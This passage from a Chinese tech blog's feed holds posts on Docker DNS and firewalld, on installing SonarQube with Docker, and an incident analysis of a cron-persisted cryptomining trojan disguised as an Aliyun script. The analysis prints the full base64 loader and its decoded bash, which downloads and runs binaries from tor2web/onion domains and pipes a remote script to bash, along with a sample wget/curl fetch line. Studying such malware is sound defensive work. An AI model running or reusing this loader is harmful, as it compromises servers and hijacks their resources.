[https://docs.docker.com/network/proxy/#use-environment-variables](https://docs.docker.com/network/proxy/#use-environment-variables)- [https://kebingzao.com/2019/02/14/centos7-ss-proxy/](https://kebingzao.com/2019/02/14/centos7-ss-proxy/)- [https://kebingzao.com/2019/02/22/docker-container-proxy/](https://kebingzao.com/2019/02/22/docker-container-proxy/)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Proxy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>archlinux docker 容器dns服务失效问题</title>
    <link href="/2020/03/05/2020-03-05-solve-archlinux-docker-container-dns-not-working/"/>
    <url>/2020/03/05/2020-03-05-solve-archlinux-docker-container-dns-not-working/</url>
    
    <content type="html"><![CDATA[<p>archlinux docker 容器dns服务失效问题</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>博主一台archlinux服务器上运行docker服务，在docker容器中dns域名解析总是失败，具体现象是可以ping通<br>DNS服务器，但是无法解析相关域名，已在容器中配置DNS，宿主机网络一切正常。具体现象如下：  </p><p><img src="https://hksanduo.github.io/images/20200305-docker-dns-not-working.png" srcset="/img/loading.gif" alt="20200305-docker-dns-not-working.png"></p><pre><code class="hljs routeros">nslookup: write <span class="hljs-keyword">to</span> <span class="hljs-string">'8.8.8.8'</span>: <span class="hljs-literal">No</span><span class="hljs-built_in"> route </span><span class="hljs-keyword">to</span> host;;<span class="hljs-built_in"> connection </span>timed out; <span class="hljs-literal">no</span> servers could be reached</code></pre><p>同样问题存在docker镜像构建过程中，博主在构建ubuntu镜像，同步软件源会出现以下问题，导致构建失败   </p><pre><code class="hljs awk">W: Failed to fetch http:<span class="hljs-regexp">//</span>archive.ubuntu.com<span class="hljs-regexp">/ubuntu/</span>dists<span class="hljs-regexp">/bionic/</span>InRelease  Temporary failure resolving <span class="hljs-string">'archive.ubuntu.com'</span></code></pre><p><img src="https://hksanduo.github.io/images/20200305-dockerfile-build-failed.png" srcset="/img/loading.gif" alt="20200305-dockerfile-build-failed.png"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="配置docker-dns"><a href="#配置docker-dns" class="headerlink" title="配置docker dns"></a>配置docker dns</h3><p>使用vim或者其他文本工具打开 <strong>/etc/docker/daemon.json</strong> 在daemon.json中设置DNS，新增<code>&quot;dns&quot;: [&quot;114.114.114.114&quot;,&quot;8.8.8.8&quot;]</code>如下所示：<br><img src="https://hksanduo.github.io/images/20200305-docker-dns-config.png" srcset="/img/loading.gif" alt="20200305-docker-dns-config.png"></p><p>设置DNS重启docker，docker容器中DNS服务仍然存在问题，通过博主不断尝试，发现系统启用firewalld防火墙，<br>导致DNS服务未生效，通过以下指令将docker0网卡添加到信任区，发现DNS服务生效了。</p><pre><code class="hljs brainfuck"><span class="hljs-comment">sudo</span> <span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> --<span class="hljs-comment">permanent</span> --<span class="hljs-comment">zone=trusted</span> --<span class="hljs-comment">change</span><span class="hljs-literal">-</span><span class="hljs-comment">interface=docker0</span><span class="hljs-comment">sudo</span> <span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> --<span class="hljs-comment">reload</span><span class="hljs-comment">sudo</span> <span class="hljs-comment">systemctl</span> <span class="hljs-comment">restart</span> <span class="hljs-comment">docker</span></code></pre><p>目前并未探明之前的防火墙策略为何会阻断DNS服务，哪位大佬可以指导一下，我将不胜感激。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><pre><code class="hljs armasm"><span class="hljs-symbol">docker</span> run --name <span class="hljs-keyword">box1 </span>-<span class="hljs-keyword">it </span>--rm <span class="hljs-keyword">busybox </span>sh</code></pre><p>我们使用busybox 启动一个容器服务来测试网络。<br><img src="https://hksanduo.github.io/images/20200305-docker-dns-working.png" srcset="/img/loading.gif" alt="20200305-docker-dns-working.png"><br>DNS服务正常。可以使用</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="https://github.com/moby/moby/issues/36151" target="_blank" rel="noopener">https://github.com/moby/moby/issues/36151</a></li><li><a href="https://askubuntu.com/questions/881843/dns-issue-with-docker-image" target="_blank" rel="noopener">https://askubuntu.com/questions/881843/dns-issue-with-docker-image</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用docker安装sonarqube</title>
    <link href="/2020/02/07/2020-02-07-install-sonarqube-on-docker/"/>
    <url>/2020/02/07/2020-02-07-install-sonarqube-on-docker/</url>
    
    <content type="html"><![CDATA[<h2 id="使用docker安装sonarqube"><a href="#使用docker安装sonarqube" class="headerlink" title="使用docker安装sonarqube"></a>使用docker安装sonarqube</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用docker部署相关应用,方便,省事,对系统影响较小,拥有开箱即用等优点,总之很香,对比互联网上找到的教程,或多或少有些问题,<br>有的甚至存在误导的嫌疑,扯这么多,其实看的最多也可能是自己.废话不多说了,开始安装.</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>个人使用的平台是archlinux,版本号为:5.4.15-arch1-1,使用的docker版本为19.03.5-ce,需要安装的Sonarqube和PostgreSQL版本均为latest(截止到今天),Sonarqube对应的版本为7.9.2,PostgreSQL对应的版本为:12.1,参考的同学注意文章的实效性.    </p><ul><li>注意:如果在获取docker镜像时速度缓慢,尝试使用中科大的镜像站,或者使用厂商的加速器均可.</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装sonarqube和postgres"><a href="#安装sonarqube和postgres" class="headerlink" title="安装sonarqube和postgres"></a>安装sonarqube和postgres</h3><p>在终端中输入以下执行,获取相应的docker镜像.</p><pre><code class="hljs css"><span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">pull</span> <span class="hljs-selector-tag">postgres</span><span class="hljs-selector-pseudo">:latest</span><span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">pull</span> <span class="hljs-selector-tag">sonarqube</span><span class="hljs-selector-pseudo">:latest</span></code></pre><h3 id="创建一个PostgreSQL-Docker容器"><a href="#创建一个PostgreSQL-Docker容器" class="headerlink" title="创建一个PostgreSQL Docker容器"></a>创建一个PostgreSQL Docker容器</h3><p>Sonarqube依赖于数据库才能正常工作，在这里，我们选择PostgreSQL。下面的命令作用是创建用户名为sonar，密码为sonar的PostgreSQL实例并运行，在mynet容器网络中将主机端口5432与容器端口5432绑定在一起。    </p><pre><code class="hljs routeros">docker <span class="hljs-builtin-name">run</span> --name sonar-postgres -e <span class="hljs-attribute">POSTGRES_USER</span>=sonar -e <span class="hljs-attribute">POSTGRES_PASSWORD</span>=sonar -d -p 5432:5432  postgres</code></pre><h3 id="创建一个Sonar-Qube-Docker容器"><a href="#创建一个Sonar-Qube-Docker容器" class="headerlink" title="创建一个Sonar Qube Docker容器"></a>创建一个Sonar Qube Docker容器</h3><p>这里我们使用使用宿主机的IP加上容器暴露出的端口号来通信,我的宿主机ip为192.168.3.200<br>以下命令的作用主要是通过JDBC连接PostgreSQL数据库创建并运行SonarQube实例。将主机端口9000绑定到mynet容器网络内部的容器端口9000。</p><pre><code class="hljs routeros">docker <span class="hljs-builtin-name">run</span> --name sonarqube -d -p 9000:9000 -e <span class="hljs-attribute">SONARQUBE_JDBC_USERNAME</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_PASSWORD</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_URL</span>=jdbc:postgresql://192.168.3.200:5432/sonar sonarqube</code></pre><h3 id="查看是否安装成功"><a href="#查看是否安装成功" class="headerlink" title="查看是否安装成功"></a>查看是否安装成功</h3><p>执行<code>docker ps</code><br><img src="https://hksanduo.github.io/images/20200207-docker-ps.png" srcset="/img/loading.gif" alt="docker-ps.png"><br>查看sonar和postgres实例进程是否正常</p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>在宿主机上直接访问<a href="http://localhost:9000,账户和密码均为admin.如果需要开放宿主机端口供其他主机访问,请使用iptables或者firewall-cmd自行增加防火墙规则,这里就不在赘述了">http://localhost:9000,账户和密码均为admin.如果需要开放宿主机端口供其他主机访问,请使用iptables或者firewall-cmd自行增加防火墙规则,这里就不在赘述了</a>.<br><img src="https://hksanduo.github.io/images/20200207-sonar-login.png" srcset="/img/loading.gif" alt="sonarqube-login.png"></p><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><h3 id="1-使用容器自定义网络-sonarqube-jdbc连接失败"><a href="#1-使用容器自定义网络-sonarqube-jdbc连接失败" class="headerlink" title="1.使用容器自定义网络,sonarqube jdbc连接失败."></a>1.使用容器自定义网络,sonarqube jdbc连接失败.</h3><p>我最初使用官方提供的方式,设置容器网络进行通信,但是sonarqube使用jdbc链接postgres数据库时总会出现连接数据库失败的提示,目前我没有找到原因,只能使用固定ip进行访问,有点儿失败.<br><img src="https://hksanduo.github.io/images/20200207-sonarqube-connect-error.png" srcset="/img/loading.gif" alt="sonarqube-connect-error.png"></p><p>以下是我安装的步骤,如果哪位大佬有解决方法,烦请不吝赐教,毕竟使用固定ip访问数据库不是一件长久的事情.</p><h4 id="为sonarqube和postgres创建相应的容器网络"><a href="#为sonarqube和postgres创建相应的容器网络" class="headerlink" title="为sonarqube和postgres创建相应的容器网络"></a>为sonarqube和postgres创建相应的容器网络</h4><p>为了提高Sonar和Postgres容器之间的通信，我们创建一个Docker Network。以下命令将创建一个名为mynet的容器网络。</p><pre><code class="hljs routeros">docker<span class="hljs-built_in"> network </span>create mynet</code></pre><h4 id="创建一个PostgreSQL-Docker容器-1"><a href="#创建一个PostgreSQL-Docker容器-1" class="headerlink" title="创建一个PostgreSQL Docker容器"></a>创建一个PostgreSQL Docker容器</h4><p>Sonarqube依赖于数据库才能正常工作，在这里，我们选择PostgreSQL。下面的命令作用是创建用户名为sonar，密码为sonar的PostgreSQL实例并运行，在mynet容器网络中将主机端口5432与容器端口5432绑定在一起。    </p><pre><code class="hljs routeros">docker <span class="hljs-builtin-name">run</span> --name sonar-postgres -e <span class="hljs-attribute">POSTGRES_USER</span>=sonar -e <span class="hljs-attribute">POSTGRES_PASSWORD</span>=sonar -d -p 5432:5432 --network mynet postgres</code></pre><h4 id="创建一个Sonar-Qube-Docker容器-1"><a href="#创建一个Sonar-Qube-Docker容器-1" class="headerlink" title="创建一个Sonar Qube Docker容器"></a>创建一个Sonar Qube Docker容器</h4><p>以下命令的作用主要是通过JDBC连接PostgreSQL数据库创建并运行SonarQube实例。将主机端口9000绑定到mynet容器网络内部的容器端口9000。</p><pre><code class="hljs routeros">docker <span class="hljs-builtin-name">run</span> --name sonarqube -p 9000:9000 -e <span class="hljs-attribute">SONARQUBE_JDBC_USERNAME</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_PASSWORD</span>=sonar -e <span class="hljs-attribute">SONARQUBE_JDBC_URL</span>=jdbc:postgresql://sonar-postgres:5432/sonar -d --network mynet sonarqube</code></pre><h3 id="2-elasticsearch-无法启动"><a href="#2-elasticsearch-无法启动" class="headerlink" title="2.elasticsearch 无法启动"></a>2.elasticsearch 无法启动</h3><p>bootstrap checks failed主要原因是elasticsearch启动失败,elasticsearch需要的vm.max_map_count至少为262144<br><img src="https://hksanduo.github.io/images/20200207-bootstrap-checks-failed.png" srcset="/img/loading.gif" alt="20200207-bootstrap-checks-failed.png">     </p><pre><code class="hljs max">解决方法,通过在root权限用户下执行以下指令:</code></pre><p>sysctl -w vm.max_map_count=262144</p><pre><code>## 参考* [https://hub.docker.com/_/sonarqube](https://hub.docker.com/_/sonarqube)* [https://birdben.github.io/2017/05/02/Docker/Docker%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%89Docker%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/](https://birdben.github.io/2017/05/02/Docker/Docker%E5%AE%9E%E6%88%98%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%89Docker%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/)* [https://s0docs0docker0com.icopy.site/engine/reference/commandline/network_create/](https://s0docs0docker0com.icopy.site/engine/reference/commandline/network_create/)* [https://www.cnkirito.moe/docker-network-bridge/](https://www.cnkirito.moe/docker-network-bridge/)* [https://gist.github.com/ceduliocezar/b3bf93125024482b5f2f479696842046](https://gist.github.com/ceduliocezar/b3bf93125024482b5f2f479696842046)* [https://github.com/SonarSource/docker-sonarqube/issues/282](https://github.com/SonarSource/docker-sonarqube/issues/282)* [https://docs.sonarqube.org/latest/setup/get-started-2-minutes/](https://docs.sonarqube.org/latest/setup/get-started-2-minutes/)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Code Review</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个名叫aliyun的挖矿木马处理过程</title>
    <link href="/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun/"/>
    <url>/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun/</url>
    
    <content type="html"><![CDATA[<h2 id="一个名叫aliyun的挖矿木马处理过程"><a href="#一个名叫aliyun的挖矿木马处理过程" class="headerlink" title="一个名叫aliyun的挖矿木马处理过程"></a>一个名叫aliyun的挖矿木马处理过程</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>老哥突然私聊我，他负责的服务器CPU飙高，发现可疑进程，疑似挖矿。<br><img src="https://hksanduo.github.io/images/20191219-trojan-01.png" srcset="/img/loading.gif" alt="20191219-trojan-01.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>为了防止事态进一步扩大，我让老哥先把这个进程kill掉，然后进行排查，可是没过多久，挖矿进程死灰复燃了，这次挖矿的名称变成了BP70vI<br><img src="https://hksanduo.github.io/images/20191219-trojan-02.png" srcset="/img/loading.gif" alt="20191219-trojan-02.png"><br>我想事情可能没那么简单，可能设置了定时任务或者有其他远控尚未发现。通过排查定时任务使用<code>crontab -l</code>，发现有一条定时任务，仔细一看原来是阿里云的shell脚本，但是整个系统就配置了这一条定时任务，难免让人怀疑。<br><img src="https://hksanduo.github.io/images/20191219-trojan-03.png" srcset="/img/loading.gif" alt="20191219-trojan-03.png"><br>当我打开<code>/root/.aliyun.sh</code>，我突然发现自己还是太年轻，攻击者尽然使用的是障眼法，没有那个运维人员会闲的蛋疼，把shell程序的内容使用base64进行编码。<br><img src="https://hksanduo.github.io/images/20191219-trojan-04.png" srcset="/img/loading.gif" alt="20191219-trojan-04.png"><br>以下是相关代码，有想研究的小伙伴可以拿去进行研究。</p><pre><code class="hljs gcode"><span class="hljs-attr">#!/bin/bash</span><span class="hljs-attr">exec &amp;&gt;/dev/null</span><span class="hljs-attr">echo ZXhlYyAmPi9</span>kZXYvb<span class="hljs-symbol">nVsbApleHBvcnQgUEFUSD0</span>kUEFUSDovYmluOi<span class="hljs-number">9</span>zYmluOi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>IvYmluOi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>I<span class="hljs-attr">vc2</span>JpbjovdX<span class="hljs-symbol">NyL2</span>xvY<span class="hljs-number">2</span>FsL<span class="hljs-number">2</span>JpbjovdX<span class="hljs-symbol">NyL2</span>xvY<span class="hljs-number">2</span>FsL<span class="hljs-number">3</span><span class="hljs-symbol">NiaW4</span>KdD<span class="hljs-number">10</span>c<span class="hljs-symbol">nVtcHM0</span>YzRvaHh<span class="hljs-number">2</span>cTd<span class="hljs-attr">vCmRpcj0</span>kKGdyZXAgeDokKGlkIC<span class="hljs-number">11</span>KTogL<span class="hljs-number">2</span>V<span class="hljs-number">0</span>Yy<span class="hljs-number">9</span>wYX<span class="hljs-symbol">Nzd2</span>R<span class="hljs-number">8</span>Y<span class="hljs-number">3</span>V<span class="hljs-number">0</span>IC<span class="hljs-number">1</span>kOiAtZjYpCmZ<span class="hljs-attr">vciBpIGluIC91</span>c<span class="hljs-number">3</span>IvYmluICRkaXIgL<span class="hljs-number">2</span>Rldi<span class="hljs-number">9</span>za<span class="hljs-name">G0</span>gL<span class="hljs-number">3</span>RtcCAvdmFyL<span class="hljs-number">3</span>RtcDtkbyB<span class="hljs-number">0</span>b<span class="hljs-number">3</span>VjaCAkaS<span class="hljs-number">9</span>pICYmIG<span class="hljs-symbol">NkICRpICYmIHJtIC1</span>mIGkgJiYgY<span class="hljs-symbol">nJlYWs7</span>Z<span class="hljs-name">G9</span>uZQp<span class="hljs-number">4</span>KCkgewpmPS<span class="hljs-number">9</span>pb<span class="hljs-symbol">nQKZD0</span>uLyQoZGF<span class="hljs-number">0</span>ZXxtZDVzdW<span class="hljs-number">18</span>Y<span class="hljs-number">3</span>V<span class="hljs-number">0</span>IC<span class="hljs-number">1</span>mMSAtZC<span class="hljs-number">0</span>pC<span class="hljs-symbol">ndnZXQgLXQxIC1</span>UMTAgLXFVLSAtLW<span class="hljs-number">5</span>vLW<span class="hljs-symbol">NoZWNrLWNlcnRpZmljYXRlICQxJGYgLU8</span>kZCB<span class="hljs-number">8</span>fCBjdXJsIC<span class="hljs-number">1</span>tMTAgLWZzU<span class="hljs-number">0</span>xrQS<span class="hljs-number">0</span>gJDEkZiAtbyRkCm<span class="hljs-symbol">NobW9</span>kICt<span class="hljs-number">4</span>ICRkOyRk<span class="hljs-meta">O3</span>JtIC<span class="hljs-number">1</span>mICRkC<span class="hljs-symbol">n0</span>KdSgpIHsKeD<span class="hljs-number">0</span>vY<span class="hljs-number">3</span>JuC<span class="hljs-symbol">ndnZXQgLXQxIC1</span>UMTAgLXFVLSAtTy<span class="hljs-number">0</span>gLS<span class="hljs-number">1</span>uby<span class="hljs-number">1</span>jaGVjay<span class="hljs-number">1</span>jZXJ<span class="hljs-number">0</span>aWZpY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>ZSAkMSR<span class="hljs-number">4</span>IHx<span class="hljs-number">8</span>IG<span class="hljs-symbol">N1</span>cmwgLW<span class="hljs-number">0</span>xMCAtZ<span class="hljs-symbol">nNTTGtBLSAkMSR4</span>C<span class="hljs-symbol">n0</span>KZ<span class="hljs-name">m9</span>yIGggaW<span class="hljs-number">4</span>gd<span class="hljs-name">G9</span>yM<span class="hljs-symbol">ndlYi5</span>pbyA<span class="hljs-number">0</span>d<span class="hljs-name">G9</span>yL<span class="hljs-name">m1</span>sI<span class="hljs-name">G9</span>uaW<span class="hljs-number">9</span>uL<span class="hljs-name">m1</span>uI<span class="hljs-name">G9</span>uaW<span class="hljs-number">9</span>uLmluL<span class="hljs-name">m5</span>ldCBvbmlvbi<span class="hljs-number">50</span>byBkM<span class="hljs-symbol">ndlYi5</span><span class="hljs-attr">vcmcgY2</span>l<span class="hljs-number">2</span>aW<span class="hljs-symbol">NsaW5</span>rL<span class="hljs-name">m5</span>ldHd<span class="hljs-attr">vcmsgb25</span>pb<span class="hljs-number">24</span>ud<span class="hljs-number">3</span>Mgb<span class="hljs-number">25</span>pb<span class="hljs-number">24</span>ub<span class="hljs-symbol">nogb25</span>pb<span class="hljs-number">24</span>uZ<span class="hljs-number">2</span>xhc<span class="hljs-number">3</span>Mgd<span class="hljs-name">G9</span>yM<span class="hljs-symbol">ndlYi5</span>zdQpkbwppZiAhIGxzIC<span class="hljs-number">9</span>wc<span class="hljs-name">m9</span>jLyQoY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>IC<span class="hljs-number">90</span>bXAvLlgxMS<span class="hljs-number">11</span>bml<span class="hljs-number">4</span>LzAwKS<span class="hljs-number">9</span>pbzsgdGhlbgp<span class="hljs-number">4</span>IHRydW<span class="hljs-number">1</span>wczRj<span class="hljs-symbol">NG9</span>oeHZx<span class="hljs-symbol">N28</span>uJGgKZWxzZQpicmVhawpmaQpkb<span class="hljs-number">25</span>lCgppZiAhIGxzIC<span class="hljs-number">9</span>wc<span class="hljs-name">m9</span>jLyQoY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>IC<span class="hljs-number">90</span>bXAvLlgxMS<span class="hljs-number">11</span>bml<span class="hljs-number">4</span>LzAwKS<span class="hljs-number">9</span>pbzsgdGhlbgooC<span class="hljs-symbol">nUgJHQudG9</span>yM<span class="hljs-symbol">ndlYi5</span>pbyB<span class="hljs-number">8</span>fAp<span class="hljs-number">1</span>ICR<span class="hljs-number">0</span>LjR<span class="hljs-number">0</span>b<span class="hljs-number">3</span>IubWwgfHwKdSAkdC<span class="hljs-number">5</span>kM<span class="hljs-symbol">ndlYi5</span><span class="hljs-attr">vcmcgfHwKdSAkdC5</span>vbmlvbi<span class="hljs-number">5</span>tbiB<span class="hljs-number">8</span>fAp<span class="hljs-number">1</span>ICR<span class="hljs-number">0</span>L<span class="hljs-name">m9</span>uaW<span class="hljs-number">9</span>uLmluL<span class="hljs-name">m5</span>ldCB<span class="hljs-number">8</span>fAp<span class="hljs-number">1</span>ICR<span class="hljs-number">0</span>L<span class="hljs-name">m9</span>uaW<span class="hljs-number">9</span>uL<span class="hljs-symbol">nRvIHx8</span>C<span class="hljs-symbol">nUgJHQuY2</span>l<span class="hljs-number">2</span>aW<span class="hljs-symbol">NsaW5</span>rL<span class="hljs-name">m5</span>ldHd<span class="hljs-attr">vcmsgfHwKdSAkdC5</span>vbmlvbi<span class="hljs-number">5</span>wZXQgfHwKdSAkdC<span class="hljs-number">50</span>b<span class="hljs-number">3</span>Iyd<span class="hljs-number">2</span>ViL<span class="hljs-symbol">nN1</span>IHx<span class="hljs-number">8</span>C<span class="hljs-symbol">nUgJHQub25</span>pb<span class="hljs-number">24</span>uZ<span class="hljs-number">2</span>xhc<span class="hljs-number">3</span>MgfHwKdSAkdC<span class="hljs-number">5</span>vbmlvbi<span class="hljs-number">53</span>cwopfGJhc<span class="hljs-number">2</span>gKZmkK|base<span class="hljs-number">64</span> -d | bash</code></pre><p>使用base64进行解码，可以得到恶意的shell脚本内容<br><img src="https://hksanduo.github.io/images/20191219-trojan-05.png" srcset="/img/loading.gif" alt="20191219-trojan-05.png"><br>解码以后的内容如下：</p><pre><code class="hljs routeros">exec &amp; &gt; /dev/<span class="hljs-literal">null</span><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin<span class="hljs-attribute">t</span>=trumps4c4ohxvq7o<span class="hljs-attribute">dir</span>=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /usr/bin <span class="hljs-variable">$dir</span> /dev/shm /tmp /var/tmp;<span class="hljs-keyword">do</span>touch <span class="hljs-variable">$i</span>/i &amp;&amp; cd <span class="hljs-variable">$i</span> &amp;&amp; rm -f i &amp;&amp; break;donex() &#123;<span class="hljs-attribute">f</span>=/int<span class="hljs-attribute">d</span>=./$(date|md5sum|cut -f1 -d-)wget -t1 -T10 -qU- --no-check-certificate <span class="hljs-variable">$1</span><span class="hljs-variable">$f</span> -O<span class="hljs-variable">$d</span> || curl -m10 -fsSLkA- <span class="hljs-variable">$1</span><span class="hljs-variable">$f</span> -o<span class="hljs-variable">$d</span>chmod +x <span class="hljs-variable">$d</span>;<span class="hljs-variable">$d</span>;rm -f <span class="hljs-variable">$d</span>&#125;u() &#123;<span class="hljs-attribute">x</span>=/crnecho <span class="hljs-string">"wget -t1 -T10 -qU- -O- --no-check-certificate <span class="hljs-variable">$1</span><span class="hljs-variable">$x</span> || curl -m10 -fsSLkA- <span class="hljs-variable">$1</span><span class="hljs-variable">$x</span>"</span>&#125;<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> tor2web.io 4tor.ml onion.mn onion.<span class="hljs-keyword">in</span>.net onion.<span class="hljs-keyword">to</span> d2web.org civiclink.network onion.ws onion.nz onion.glass tor2web.su<span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> ! ls /proc/$(cat /tmp/.X11-unix/00)/io; thenx trumps4c4ohxvq7o.<span class="hljs-variable">$h</span><span class="hljs-keyword">else</span>breakfidone<span class="hljs-keyword">if</span> ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then(u <span class="hljs-variable">$t</span>.tor2web.io ||u <span class="hljs-variable">$t</span>.4tor.ml ||u <span class="hljs-variable">$t</span>.d2web.org ||u <span class="hljs-variable">$t</span>.onion.mn ||u <span class="hljs-variable">$t</span>.onion.<span class="hljs-keyword">in</span>.net ||u <span class="hljs-variable">$t</span>.onion.<span class="hljs-keyword">to</span> ||u <span class="hljs-variable">$t</span>.civiclink.network ||u <span class="hljs-variable">$t</span>.onion.pet ||u <span class="hljs-variable">$t</span>.tor2web.su ||u <span class="hljs-variable">$t</span>.onion.glass ||u <span class="hljs-variable">$t</span>.onion.ws)|bashfi</code></pre><p>通过分析，我们可以发现，该shell首先会判断当前用户是否对<code>/usr/bin 当前用户的home目录 /dev/shm /tmp /var/tmp</code>这几个目录拥有读写权限。</p><blockquote><p><strong>/tmp/.X11-unix/00是什么鬼</strong><br>X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上它们可以通过TCP/IP Socket来实现沟通，而在本机上它们通过一个Unix-domain socket来沟通.Unix-domain socket其实很TCP/IP socket很类似，只不过它指向的是一个文件路径，而且无需通过网卡进行转发，因此相对来说更安全，更更快些。而 /tmp/.X11-unix 其实就是存放这些Unix-domain Socket的地方。一般来说 /tmp/.X11-unix 下面只会有一个 Unix-domain Socket(因为一般只有一个Xserver在运行)，但若系统同时运行多个Xserver，也可能会有多个Unix Domain Socket出现的情况。具体可以参考参考内容里的文章，里面有详细说明</p></blockquote><p>但是，通过查看<code>/tmp/.X11-unix/</code>目录中的<strong>00</strong>文件，我并未发现该文件的种类并不是<strong>s</strong>，攻击者可能是为了掩人耳目，故意在该目录下设置一个文件，来存储远控木马进程id<br><img src="https://hksanduo.github.io/images/20191219-trojan-06.png" srcset="/img/loading.gif" alt="20191219-trojan-06.png"><br>通过判断 <strong>/proc/木马进程id/io</strong> 文件是否存在，如果不存在执行<strong>X</strong>函数从以下这些站点三级域名<strong>trumps4c4ohxvq7o</strong>下载int木马客户端</p><ul><li>tor2web.io</li><li>4tor.ml</li><li>onion.mn</li><li>onion.in.net</li><li>onion.to</li><li>d2web.org</li><li>civiclink.network</li><li>onion.ws</li><li>onion.nz</li><li>onion.glass</li><li>tor2web.su</li></ul><p>通过全网检这些三级域名，发现年中的时候有人中招了，文件名不同，但是手法很像，有兴趣可以查看我提供参考链接。下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。<br>具体使用wget或者curl请求下载int木马文件拼接案例语句如下：</p><pre><code class="hljs llvm">wget -t<span class="hljs-number">1</span> -T<span class="hljs-number">10</span> -qU- --no-check-certificate trumps<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>ohxvq<span class="hljs-number">7</span>o.onion.mn/int -O./e<span class="hljs-number">0</span>ee<span class="hljs-number">4</span>ac<span class="hljs-number">14e82501</span>dc<span class="hljs-number">127890</span>f<span class="hljs-number">75770</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>   || curl -m<span class="hljs-number">10</span> -fsSLkA- trumps<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>ohxvq<span class="hljs-number">7</span>o.onion.mn/int -o./e<span class="hljs-number">0</span>ee<span class="hljs-number">4</span>ac<span class="hljs-number">14e82501</span>dc<span class="hljs-number">127890</span>f<span class="hljs-number">75770</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span></code></pre><p>将下载下来的int和crn文件进行分析，<br>virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。<br>crn检测结果：<br><img src="https://hksanduo.github.io/images/20191219-trojan-17.png" srcset="/img/loading.gif" alt="20191219-trojan-17.png"><br>int检测结果：<br><img src="https://hksanduo.github.io/images/20191219-trojan-18.png" srcset="/img/loading.gif" alt="20191219-trojan-18.png"><br>返现int木马程序主体，crn为shell文件，目的是下载int木马程序并运行，crn文件并未进行编码和混淆，不太清楚作者为何这么做。<br><img src="https://hksanduo.github.io/images/20191219-trojan-19.png" srcset="/img/loading.gif" alt="20191219-trojan-19.png"><br>将int扔到IDA并未发现什么，只发现基本的逻辑流程，可能个人逆向功底太弱了，那位大佬分析了，可以请教一下。<br><img src="https://hksanduo.github.io/images/20191219-trojan-20.png" srcset="/img/loading.gif" alt="20191219-trojan-20.png"><br>接下来我们继续分析aliyun.sh脚本，发现木马通过判断 <strong>/proc/木马进程id/io</strong> 文件是否存在，如果不存在执行<strong>U</strong>函数从以下这些站点三级域名<strong>trumps4c4ohxvq7o</strong>下载<strong>crn</strong> shell脚本并执行，<br>使用<code>lsof</code>命令查看该进程相关信息，如果没有相关命令，请自行安装<br><img src="https://hksanduo.github.io/images/20191219-trojan-07.png" srcset="/img/loading.gif" alt="20191219-trojan-07.png"><br>可以发现相应的远控客户端（/usr/bin/46e5166a46208402e09732a78526b5f0）已删除<br>使用top我们可以发现，该挖矿木马的客户端的进程id为8391，<br><img src="https://hksanduo.github.io/images/20191219-trojan-08.png" 